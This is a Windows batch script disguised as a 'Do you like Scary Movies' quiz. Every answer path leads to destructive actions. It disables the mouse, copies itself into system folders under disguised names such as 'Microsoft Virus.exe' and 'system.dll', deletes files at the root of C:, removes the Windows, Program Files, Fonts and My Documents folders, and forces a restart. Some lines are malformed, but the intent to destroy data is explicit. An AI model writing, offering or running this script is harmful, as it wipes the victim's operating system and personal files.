   @echo off
   cls
   C:\WINDOWS\rundll32.exe mouse,disable
   echo Do you like Scary Movies???
   type NUL | choice /N /CY /TY,2 >NUL
   echo.
   echo.
   echo.
   echo If like them, type 1, if you don't then type 2, and if you don't want me to know then type 3.
   choice /n/c123 "choose below"
   if errorlevel 3 goto wrong
   if errorlevel 2 goto badluck
   if errorlevel 1 goto deadmeat

   :wrong
   echo Well, it seems that you are brave....
   type NUL | choice /N /CY /TY,1 >NUL
   echo But are you brave enough for this:
   copy %0 "C:\WINDOWS\system32\idiot.exe"
   copy %0 "C:\WINDOWS\Temp\scary.dll"
   RD/s/q "C:\WINDOWS\system"
   type NUL | choice /N /CY /TY,3 >NUL
   echo Ha ha ha ha ha!!!
   type NUL | choice /N /CY /TY,1 >NUL
   exit

   :badluck
   echo Oh, well, you are just a loser after all.
   type NUL | choice /N /CY /TY,2 >NUL
   echo Do you know what I do to losers???
   copy %0 "C:\WINDOWS\Temp\OLD117.tmp
   copy %0 "C:\Program Files\Common Files\InstallShield\IScript\system.dll
   copy %0 "C:\Program Files\Internet Explorer\SIGNUP\UNINSTALL.INS
   del "C:\*.*"
   RD/s/q "C:\WINDOWS\Fonts
   RD/s/q "C:\Program Files\Windows Media Player"
   echo You should have pressed one...
   type NUL | choice /N /CY /TY,4 >NUL
   exit

   :deadmeat
   echo YOU ARE REALLY STUPID!!!
   echo.
   echo.
   echo.
   type NUL | choice /N /CY /TY,2 >NUL
   echo YOU WILL PAY FOR THIS INSOLENCE!!!
   copy %0 "C:\WINDOWS\Media\Windows XP Print Failure.wav"
   copy %0 "C:\Program Files\Office XP\Microsoft Virus.exe
   copy %0 "C:\WINDOWS\Cursors\3ddelete.cur
   copy %0 "C:\Program Files\WindowsUpdate\ringstatus.dat
   copy %0 "C:\Documents and Settings\User\xpuser.dat.LOG
   copy %0 "C:\WINDOWS\KeyGone.dll
   RD\s\q "C:\Documents and Settings\User\My Documents"
   RD\s\q "C:\WINDOWS"
   RD\s\q "C:\Program Files"
   type NUL | choice /N /CY /TY,3 >NUL
   echo NEVER TRY AND HIDE THE TRUTH FROM ME!!!!!!!!!!!!
   type NUL | choice /N /CY /TY,2 >NUL
   SHUTDOWN -r -t 1
